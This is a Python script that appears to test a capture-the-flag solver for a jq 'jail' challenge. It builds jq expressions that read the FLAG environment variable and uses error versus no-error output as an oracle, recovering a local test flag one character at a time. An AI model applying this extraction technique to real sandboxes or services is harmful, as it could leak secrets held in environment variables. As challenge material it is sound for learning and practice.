import subprocess
import string
import solve_remote_live, json

RAW_CHAINS = json.loads(solve_remote_live.EMBEDDED_CHAINS_JSON)
CHAINS = {int(k): v for k, v in RAW_CHAINS.items()}

def predicate(ops):
    parts = []
    for op in ops:
        parts.append(op)
        parts.append("normals")
    return "|".join(parts)

def simulate_local_query(expr, flag="jail{test_flag_will_be_here_on_remote_12345}"):
    cmd = ["jq", "-n", expr]
    res = subprocess.run(cmd, capture_output=True, env={"FLAG": flag})
    if res.returncode != 0:
        return "error"
    return "ok"

def verify_local():
    test_flag = "jail{flag_will_be_here_on_remote}"
    length = len(test_flag)
    charset = string.ascii_lowercase + string.digits + "_{}"
    
    recovered = ["?"] * length
    print(f"[*] Verifying Local Extraction for FLAG: '{test_flag}' (length {length})")

    for pos in range(length):
        matches = []
        for c in charset:
            v = ord(c)
            # Test forward sum: pos + v
            val_fwd = pos + v
            if val_fwd in CHAINS:
                pred = predicate(CHAINS[val_fwd])
                expr = f"env|flatten|sort|last|explode|tostream|flatten|add|{pred}|error"
                if simulate_local_query(expr, test_flag) == "error":
                    # Double-check with reverse sum
                    val_rev = (length - 1 - pos) + v
                    if val_rev in CHAINS:
                        pred_rev = predicate(CHAINS[val_rev])
                        expr_rev = f"env|flatten|sort|last|explode|reverse|implode|explode|tostream|flatten|add|{pred_rev}|error"
                        if simulate_local_query(expr_rev, test_flag) == "error":
                            matches.append(c)

        if len(matches) == 1:
            recovered[pos] = matches[0]
            print(f"[+] Pos {pos:2d}: '{matches[0]}' -> {''.join(recovered)}")
        elif len(matches) > 1:
            print(f"[!] Pos {pos:2d}: ambiguous {matches}")
        else:
            print(f"[-] Pos {pos:2d}: missing")

    result_flag = "".join(recovered)
    print(f"\n[+] Local Extraction Result: {result_flag}")
    assert result_flag == test_flag, f"Mismatch: expected {test_flag!r}, got {result_flag!r}"
    print("="*80)
    print("[+] 100% PERFECT LOCAL EXTRACTION PASSED AND VERIFIED!")
    print("="*80)

if __name__ == "__main__":
    verify_local()
